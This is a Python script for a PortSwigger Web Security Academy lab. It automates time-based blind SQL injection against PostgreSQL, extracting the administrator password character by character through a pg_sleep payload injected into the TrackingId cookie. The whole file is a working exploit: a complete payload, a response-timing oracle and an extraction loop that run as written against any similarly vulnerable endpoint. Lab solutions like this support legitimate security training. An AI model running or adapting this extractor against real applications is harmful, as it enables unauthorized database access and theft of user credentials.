import requests
import string
import time

# ─────────────────────────────────────────────────────────────────────────────
# Time-Based Blind SQL Injection — Password Extractor (PostgreSQL)
# Lab: PortSwigger Web Security Academy
#      "Blind SQL injection with time delays and information retrieval"
#
# Oracle: If CASE WHEN condition is TRUE → pg_sleep(3) → response delays ~3s
#         If FALSE → pg_sleep(0) → response is immediate
#
# Injection style: String concatenation (||) — works without stacked queries
#
# Usage:
#   Update tracking_id and session_cookie with YOUR lab values, then:
#   python3 time_based_sqli.py
# ─────────────────────────────────────────────────────────────────────────────

# Target (update subdomain for each new lab session)
url = "https://0ab2009c04b2502b8027e48000160095.web-security-academy.net/"

# Update both values from your Burp / browser session each time
tracking_id    = "51sua3nyQiEwB5th"
session_cookie = "QULyXGpc9KXIWEfVBR3Rbx9ndp6qk5Vq"

charset = string.ascii_lowercase + string.digits  # a-z then 0-9

headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": url
}

password = ""


def test_char(position: int, char: str) -> bool:
    """
    Injects a time-based condition for one character at one position.
    Returns True if response time > 2.5s (sleep fired → char matched).
    """
    payload = (
        f"{tracking_id}'||("
        f"SELECT CASE WHEN (username='administrator' AND substring(password,{position},1)='{char}') "
        f"THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users"
        f")||'--"
    )

    cookies = {
        "TrackingId": payload,
        "session": session_cookie
    }

    start   = time.time()
    requests.get(url, cookies=cookies, headers=headers, timeout=15)
    elapsed = time.time() - start

    return elapsed > 2.5


# ── Main extraction loop ─────────────────────────────────────────────────────

for position in range(1, 21):   # Password is 20 characters long
    print(f"[+] Testing position {position}...")

    for char in charset:
        if test_char(position, char):
            print(f"    [✔] Position {position}: '{char}'")
            password += char
            break
    else:
        print(f"    [!] No match at position {position} — check cookie values")

print(f"\n🔥 Extracted password: {password}")
